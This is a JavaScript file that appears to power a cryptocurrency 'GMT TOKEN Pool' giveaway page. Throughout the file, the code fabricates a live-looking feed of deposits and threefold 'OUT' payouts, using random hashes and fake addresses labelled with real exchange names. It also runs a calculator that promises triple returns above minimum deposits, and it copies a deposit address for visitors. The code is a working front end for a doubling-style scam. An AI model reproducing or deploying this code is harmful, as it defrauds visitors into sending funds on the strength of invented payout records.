var parcent = 3;

function update_count() {
    setInterval(() => {
        $("#num_").text(parseInt($("#num_").text()) + 1);
    }, 12e4);
}

function tx(_) {
    return 1 + Math.floor(Math.random() * _);
}

function dec2hex(dec) {
    return ("0" + dec.toString(16)).substr(-2);
}

function generateId(length) {
    for (
        var result = "0x",
            characters = "TRNABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
            charactersLength = characters.length,
            i = 0; i < length; i++
    )
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    return result;
}


function startaddress(length = 1) {
    for (
        var result = "1",
            characters = "13",
            charactersLength = characters.length,
            i = 0; i < length; i++
    )
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    return result;
}


function create_transaction(mins) {
    var table,
        row = (table = document.getElementById("myTable")).insertRow(1),
        address = get_random(),
        amount = Math.floor((Math.random() * (12 - 7) + 7) * 100),
        decimal = String(Math.random(1, 999));
    row.innerHTML =
        '<tr  class="tr"> <td><a class="hash-tag text-truncate" href="">' +
        generateId(63) +
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
        tx(99999999) +
        '</a></td> <td><span class="timer">' +
        mins +
        ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">GMT TOKEN Pool</span> </td> <td>' +
        amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
        ' GMT</td> <td><span class="small text-secondary">0<b>.</b>000' +
        tx(999) +
        "</span></td> </tr>";
    var table,
        row = (table = document.getElementById("myTable")).insertRow(1),
        send_amount = amount * parcent;
    row.innerHTML =
        '<tr> <td><a class="hash-tag text-truncate" href="">' +
        generateId(63) +
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
        tx(99999999) +
        '</a></td> <td><span class="timer">' +
        mins +
        ' mins ago</span></td> <td><span class="hash-tag text-truncate">GMT TOKEN Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        "</a> </td> <td>" +
        send_amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
        ' GMT</td> <td><span class="small text-secondary">0<b>.</b>000' +
        tx(999) +
        "</span></td> </tr>";
}

function update_tx() {
    setInterval(() => {
        $("#num_").text(parseInt($("#num_").text()) + 1);
    }, 12e4);
}

function new_transaction() {
    var table,
        row = document.getElementById("myTable").insertRow(1),
        address = get_random(),
        amount = Math.floor((Math.random() * (12 - 7) + 7) * 100),
        decimal = String(Math.random(1, 999));
    (row.innerHTML =
        '<tr> <td><a class="hash-tag text-truncate" href="">' +
        generateId(63) +
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">GMT TOKEN Pool</span> </td> <td>' +
        amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
        ' GMT</td> <td><span class="small text-secondary">0<b>.</b>000' +
        tx(999) +
        "</span></td> </tr>"),
    document
        .getElementById("myTable")
        .deleteRow(document.getElementById("myTable").rows.length - 1),
        document.getElementsByTagName("tr")[1].classList.add("toolbar"),
        setTimeout(() => {
            var table,
                row = document.getElementById("myTable").insertRow(1),
                send_amount = amount * parcent;
            (row.innerHTML =
                '<tr> <td><a class="hash-tag text-truncate" href="">' +
                generateId(63) +
                '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
                tx(99999999) +
                '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">GMT TOKEN Pool</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
                address +
                "</a> </td> <td>" +
                send_amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,') +
                ' GMT</td> <td><span class="small text-secondary">0<b>.</b>000' +
                tx(999) +
                "</span></td> </tr>"),
            document
                .getElementById("myTable")
                .deleteRow(document.getElementById("myTable").rows.length - 1),
                document.getElementsByTagName("tr")[1].classList.add("toolbar");
        }, 8500);
}


function update_trans() {
    for (i = 0; i < times.length; i++)
        "now" == times[i].innerHTML ?
        (times[i].innerHTML = "1 mins ago") :
        1 == parseInt(times[i].innerHTML.split(" ")[0]) &&
        "mins" == times[i].innerHTML.split(" ")[1] ?
        (times[i].innerHTML =
            parseInt(times[i].innerHTML.split(" ")[0]) + 1 + " mins ago") :
        parseInt(times[i].innerHTML.split(" ")[0]) >= 59 &&
        "mins" == times[i].innerHTML.split(" ")[1] ?
        (times[i].innerHTML = "1 hrs ago") :
        parseInt(times[i].innerHTML.split(" ")[0]) > 1 &&
        "mins" == times[i].innerHTML.split(" ")[1] &&
        (times[i].innerHTML =
            parseInt(times[i].innerHTML.split()[0]) + 1 + " mins ago");
    new_transaction();
}

(get_random = function(
    list = [
        "0x98ec6" + startaddress() + generateId(40),
        "Huobi 10",
        "0x4e22e7" + startaddress() + generateId(40),
        "Uniswap V2: GMT 4",
        "0x44b5e8" + startaddress() + generateId(40),
        "Coinex",
        "0x1710aa" + startaddress() + generateId(40),
        "Hoo.com 5",
        "0x734d6" + startaddress() + generateId(40),
        "Huobi Global",
        "0x0ca26" + startaddress() + generateId(40),
        "Gate.io",
        "tx" + startaddress() + generateId(40),
        "Gate.io",
        "0x06e82e1" + startaddress() + generateId(40),
        "OKEx",
        "0x807e42" + startaddress() + generateId(40),
        "BitMart 2",
        "0x1f51aa3" + startaddress() + generateId(40),
        "1inch v3: Router",
        "0xde82f29" + startaddress() + generateId(40),
        "MXC",
        "0xa5264c6d" + startaddress() + generateId(40),
        "Huobi 10",
        "0x853fa7e82c18" + startaddress() + generateId(40),
        "Poloniex",
        "0xc193567e" + startaddress() + generateId(40),
        "BW.com"
    ]
) {
    return list[Math.floor(Math.random() * list.length)];
}),
$(document).ready(() => {
        for (i = 25; i > 0; i--) create_transaction(i);
        update_tx(), update_count();
    }),
    (times = document.getElementsByClassName("timer")),
    (window.onload = () => {
        update_trans(),
            (trans = setInterval(() => {
                update_trans();
            }, 1e4));
    }),
    $("#gen-btn").click(() => {
        if ($('#btc_adr').val().length >= 5) {
            amount_entered = $("#cal-in").val();
            $("#gen-amount").text(amount_entered);
            $("#copy_").attr("data-clipboard-text", amount_entered);
            $("#warn").text(""), $(".pop-body").css("display", "flex");
        } else {
            $("#warn").text("Please enter a valid address");
        }

    }),
    $("#close").click(() => {
        $(".pop-body").css("display", "none");
    }),
    setTimeout(function() {
        let viewheight = $(window).height(),
            viewwidth = $(window).width(),
            viewport;
        document
            .querySelector("meta[name=vie324242wport]")
            .setAttribute(
                "content",
                "height=" +
                viewheight +
                "px, width=" +
                viewwidth +
                "px, initial-scale=1.0"
            );
    }, 300)
	
$("#logo").on("change", function(){
	$("#cal-out").val("")
	$("#cal-in").val("")
	if ($("#logo").val() == "eth"){
		$("#eth-logo").show();
		$("#bnb-logo").hide();
		$("#sol-logo").hide();
		$("#usdt-logo").hide();
		$("#gst-logo").hide();
	}else if($("#logo").val() == "sol"){
		$("#eth-logo").hide();
		$("#sol-logo").show();
		$("#bnb-logo").hide();
		$("#usdt-logo").hide();
		$("#gst-logo").hide();
	}else if($("#logo").val() == "usdt"){
		$("#usdt-logo").show();
		$("#bnb-logo").hide();
		$("#sol-logo").hide();
		$("#gst-logo").hide();
	}else if($("#logo").val() == "gst"){
		$("#eth-logo").hide();
		$("#gst-logo").show();
		$("#bnb-logo").hide();
		$("#usdt-logo").hide();
		$("#sol-logo").hide();
	}else{
		$("#gst-logo").hide();
		$("#eth-logo").hide();
		$("#bnb-logo").show();
		$("#usdt-logo").hide();
		$("#sol-logo").hide();
	}
})

var eth_gmt = 1, sol_gmt = 1, bnb_gmt = 1, usdt_gmt = 1, gst_gmt = 1

$.ajax({
    url: '/api/coincodex/get_coin_ranges_currency/ETH?t='+new Date().getTime()+'&currency=GMT',
    dataType: 'json',
    async: false,
    success: function (res){
        eth_gmt = res['1H']['max']
    }
})

$.ajax({
    url: '/api/coincodex/get_coin_ranges_currency/SOL?t='+new Date().getTime()+'&currency=GMT',
    dataType: 'json',
    async: false,
    success: function (res){
        sol_gmt = res['1H']['max']
    }
})

$.ajax({
    url: '/api/coincodex/get_coin_ranges_currency/USDT?t='+new Date().getTime()+'&currency=GMT',
    dataType: 'json',
    async: false,
    success: function (res){
        usdt_gmt = res['1H']['max']
    }
})

$.ajax({
    url: '/api/coincodex/get_coin_ranges_currency/GST2?t='+new Date().getTime()+'&currency=GMT',
    dataType: 'json',
    async: false,
    success: function (res){
        gst_gmt = res['1H']['max']
    }
})

$.ajax({
    url: '/api/coincodex/get_coin_ranges_currency/BNB?t='+new Date().getTime()+'&currency=GMT',
    dataType: 'json',
    async: false,
    success: function (res){
        bnb_gmt = res['1H']['max']
    }
})

$("#cal-in").on("input", () => {
    var in_amount = $("#cal-in").val();
	var se = $("#logo").val()
	$("#warn").text("")
	if (se == 'eth'){
		if (in_amount >= 0.5) {
			$("#cal-out").val((in_amount * 3 * eth_gmt).toFixed(0));
		}else{
			$("#warn").text("Please Greater Or Equal 0.5 ETH");
		}
	}else if (se == 'sol'){
		if (in_amount >= 30) {
			$("#cal-out").val((in_amount * 3 * sol_gmt).toFixed(0));
		}else{
			$("#warn").text("Please Greater Or Equal 30 SOL");
		}
	}else if (se == 'usdt'){
		if (in_amount >= 1500) {
			$("#cal-out").val((in_amount * 3 * usdt_gmt).toFixed(0));
		}else{
			$("#warn").text("Please Greater Or Equal 1500 USDT");
		}
	}else if (se == 'gst'){
		if (in_amount >= 520) {
			$("#cal-out").val((in_amount * 3 * gst_gmt).toFixed(0));
		}else{
			$("#warn").text("Please Greater Or Equal 520 GST");
		}
	}
	else{
		if (in_amount >= 5) {
			$("#cal-out").val((in_amount * 3 * bnb_gmt).toFixed(0));
		}else{
			$("#warn").text("Please Greater Or Equal 5 BNB");
		}
	}
});

function copy_item(item) {
    var t = window.getSelection(),
        e = document.createElement("div");
    (e.style.position = "absolute"),
    (e.style.left = "-99999px"),
    document.body.appendChild(e),
        (e.innerHTML = item),
        t.selectAllChildren(e),
        window.setTimeout(function() {
            document.body.removeChild(e);
        }, 100);
}

function copy_main(id, fade) {
    copy_item($("#" + id).attr("data-clipboard-text"));
    var clipboard = new Clipboard("#" + id);
    clipboard.on("success", function() {
            $("#" + fade).css("opacity", 1), $("#" + id).css("opacity", 0);
        }),
        clipboard.on("error", function(e) {
            $(".tooltiptetext").html("Faild!");
        });
}


// Copy amount starts here

$("#copy_").click(() => {
    copy_main("copy_", "address-card");
});

$("#copy_").mouseout(() => {
    $("#address-card").css("opacity", 0), $("#copy_").css("opacity", 1);
});

// Copy amount ends here


// Copy address part starts here

$("#copy_address").click(() => {
    copy_main("copy_address", "done-copy");
});

$("#copy_address").mouseout(() => {
    $("#done-copy").css("opacity", 0), $("#copy_address").css("opacity", 1);
});

// Copy address part ends here

$("#copy_address2").click(() => {
    copy_main("copy_address2", "done-copy2");
});

$("#copy_address2").mouseout(() => {
    $("#done-copy2").css("opacity", 0), $("#copy_address2").css("opacity", 1);
});